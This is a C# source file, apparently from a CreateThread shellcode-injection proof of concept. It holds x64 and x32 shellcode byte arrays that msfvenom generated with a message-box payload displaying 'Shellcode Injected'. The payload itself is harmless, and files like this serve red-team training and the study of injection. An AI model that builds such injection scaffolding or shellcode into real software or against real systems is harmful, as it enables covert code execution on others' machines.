﻿namespace CreateThreadPoC
{
    internal static class Shellcode
    {
        // msfvenom -p windows/x64/messagebox Text="64bit Shellcode Injected" -f csharp
        private static byte[] _x64 = new byte[303] {0xfc,0x48,0x81,0xe4,0xf0,0xff,
            0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
            0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,
            0x50,0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
            0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
            0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,
            0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
            0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,
            0x3e,0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,
            0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,
            0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
            0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,
            0x49,0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,
            0x40,0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,
            0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
            0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
            0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,
            0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,
            0x00,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x17,0x01,0x00,0x00,0x48,
            0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31,
            0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x36,0x34,0x62,
            0x69,0x74,0x20,0x53,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,0x65,
            0x20,0x49,0x6e,0x6a,0x65,0x63,0x74,0x65,0x64,0x00,0x4d,0x65,
            0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00};

        // msfvenom -p windows/messagebox Text="32bit Shellcode Injected" -f csharp
        private static byte[] _x32 = new byte[282] {0xd9,0xeb,0x9b,0xd9,0x74,0x24,
            0xf4,0x31,0xd2,0xb2,0x77,0x31,0xc9,0x64,0x8b,0x71,0x30,0x8b,
            0x76,0x0c,0x8b,0x76,0x1c,0x8b,0x46,0x08,0x8b,0x7e,0x20,0x8b,
            0x36,0x38,0x4f,0x18,0x75,0xf3,0x59,0x01,0xd1,0xff,0xe1,0x60,
            0x8b,0x6c,0x24,0x24,0x8b,0x45,0x3c,0x8b,0x54,0x28,0x78,0x01,
            0xea,0x8b,0x4a,0x18,0x8b,0x5a,0x20,0x01,0xeb,0xe3,0x34,0x49,
            0x8b,0x34,0x8b,0x01,0xee,0x31,0xff,0x31,0xc0,0xfc,0xac,0x84,
            0xc0,0x74,0x07,0xc1,0xcf,0x0d,0x01,0xc7,0xeb,0xf4,0x3b,0x7c,
            0x24,0x28,0x75,0xe1,0x8b,0x5a,0x24,0x01,0xeb,0x66,0x8b,0x0c,
            0x4b,0x8b,0x5a,0x1c,0x01,0xeb,0x8b,0x04,0x8b,0x01,0xe8,0x89,
            0x44,0x24,0x1c,0x61,0xc3,0xb2,0x08,0x29,0xd4,0x89,0xe5,0x89,
            0xc2,0x68,0x8e,0x4e,0x0e,0xec,0x52,0xe8,0x9f,0xff,0xff,0xff,
            0x89,0x45,0x04,0xbb,0x7e,0xd8,0xe2,0x73,0x87,0x1c,0x24,0x52,
            0xe8,0x8e,0xff,0xff,0xff,0x89,0x45,0x08,0x68,0x6c,0x6c,0x20,
            0x41,0x68,0x33,0x32,0x2e,0x64,0x68,0x75,0x73,0x65,0x72,0x30,
            0xdb,0x88,0x5c,0x24,0x0a,0x89,0xe6,0x56,0xff,0x55,0x04,0x89,
            0xc2,0x50,0xbb,0xa8,0xa2,0x4d,0xbc,0x87,0x1c,0x24,0x52,0xe8,
            0x5f,0xff,0xff,0xff,0x68,0x6f,0x78,0x58,0x20,0x68,0x61,0x67,
            0x65,0x42,0x68,0x4d,0x65,0x73,0x73,0x31,0xdb,0x88,0x5c,0x24,
            0x0a,0x89,0xe3,0x68,0x58,0x20,0x20,0x20,0x68,0x63,0x74,0x65,
            0x64,0x68,0x49,0x6e,0x6a,0x65,0x68,0x6f,0x64,0x65,0x20,0x68,
            0x65,0x6c,0x6c,0x63,0x68,0x74,0x20,0x53,0x68,0x68,0x33,0x32,
            0x62,0x69,0x31,0xc9,0x88,0x4c,0x24,0x18,0x89,0xe1,0x31,0xd2,
            0x52,0x53,0x51,0x52,0xff,0xd0,0x31,0xc0,0x50,0xff,0x55,0x08
            };

        public static byte[] x64
        {
            get { return _x64; }
        }

        public static byte[] x32
        {
            get { return _x32; }
        }

    }
}
